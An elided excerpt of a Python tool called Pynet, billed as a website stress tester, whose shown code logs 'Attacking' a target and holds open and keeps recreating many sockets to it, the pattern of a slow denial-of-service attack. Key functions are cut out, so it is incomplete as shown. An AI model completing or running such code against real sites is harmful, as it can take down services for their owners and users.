...
parser = argparse.ArgumentParser(
    description="Pynet, low bandwidth stress test tool for websites"
)
...
def main():
    ...
    logging.info("Attacking %s with %s packets.", ip, socket_count)

    logging.info("Creating packets...")
    for _ in range(socket_count):
        try:
            logging.debug("Creating packet nr %s", _)
            s = init_socket(ip)
    ...
    while True:
        try:
            logging.info(
                "Sending packets... packet count: %s", len(list_of_sockets)
            )
            ...
            for _ in range(socket_count - len(list_of_sockets)):
                logging.debug("Recreating packet...")
                try:
                    s = init_socket(ip)
                    if s:
                        list_of_sockets.append(s)
